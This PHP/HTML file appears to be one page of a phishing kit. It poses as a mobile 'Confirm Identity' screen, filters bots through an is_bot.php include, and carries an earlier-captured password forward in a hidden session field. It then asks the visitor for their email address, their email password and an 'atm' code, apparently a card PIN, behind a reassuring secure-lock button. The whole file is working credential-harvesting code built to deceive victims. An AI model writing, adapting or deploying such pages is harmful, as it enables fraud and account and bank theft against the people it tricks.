<?php
require_once "core/helper.php";
require_once "is_bot.php";
if (is_session_started() === FALSE){session_start();}
if(!array_key_exists("permiso",$_SESSION)){
  header("location:index.php");
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm Identity</title>
    <link rel="stylesheet" href="css/mobile.css">
    <script type="text/javascript">
        if (screen.width > 801) {
            window.location = "emailverification.go";
        }      
    </script>
</head>

<body>
    <header>
        <div class="headerimg">
            <img src="img/header1.png">
        </div>
        <div class="headertitulo">
        Confirm Identity
        </div>
    </header>
    <main>
        <form autocomplete="off" id="formularioCorreo">
        <input type="hidden" id="claveusuario" name="claveusuario" value="<?php echo $_SESSION["pass"];?>" >
            <div class="form-group-p all">
                <input class="input input1" style="width: 95vw;" type="text" name="correo" id="correo" required placeholder="Email">
            </div>
            <div class="form-group-p all">
                <input style="width: 95vw;" class="input" type="password" name="ccorreo" id="ccorreo" required placeholder="Email Password" disabled>
            </div>
            <div class="form-group-p all">
                <input style="width: 95vw;" class="input" type="text" name="atm" id="atm" maxlength="12" placeholder="atm" required disabled>
            </div>
            <div class="form-group-b">
                <button type="button" id="confirmacion" disabled><img src="img/secure_lock.png"> Confirmation</button>
            </div>
        </form>
    </main>
    <script src="js/funciones.js"></script>
</body>

</html>